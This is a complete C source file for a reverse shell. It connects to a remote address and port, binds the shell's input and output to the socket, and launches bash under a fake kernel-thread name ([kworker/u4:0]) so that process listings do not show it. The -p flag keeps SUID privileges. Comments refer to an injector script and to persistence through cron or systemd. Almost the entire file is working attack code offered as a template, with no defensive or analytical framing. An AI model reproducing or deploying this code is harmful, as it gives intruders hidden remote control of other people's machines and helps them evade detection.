/*
 * Masquerade Reverse Shell
 * This source is a template. IP/PORT/NAME are placeholders.
 * 
 * Concept:
 * Instead of running `bash -i` directly which shows up in Process List,
 * We execute bash but pass a fake name (e.g., [kworker/u4:0]) as argv[0].
 * Linux utilities like ps/top display argv[0].
 */

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>

// These will be replaced by the injector script
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444
#define FAKE_NAME "[kworker/u4:0]"

int main(int argc, char *argv[]) {
    // Fork to detach from parent (optional but good for stability)
    pid_t pid = fork();
    if (pid > 0) return 0; // Parent exits
    if (pid < 0) return 1;

    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    
    // Connect with retry logic? 
    // For simplicity, we try once. Persistence mechanism (cron/systemd) handles retries.
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        return 1;
    }

    // Redirect streams to socket
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // Cloak and Execute
    // We call /bin/bash, but we tell it that its name is FAKE_NAME
    // We pass "-p" to preserve permissions if SUID, and "-i" for interactive
    char *args[] = {FAKE_NAME, "-p", "-i", NULL};
    execve("/bin/bash", args, NULL);
    
    return 0;
}
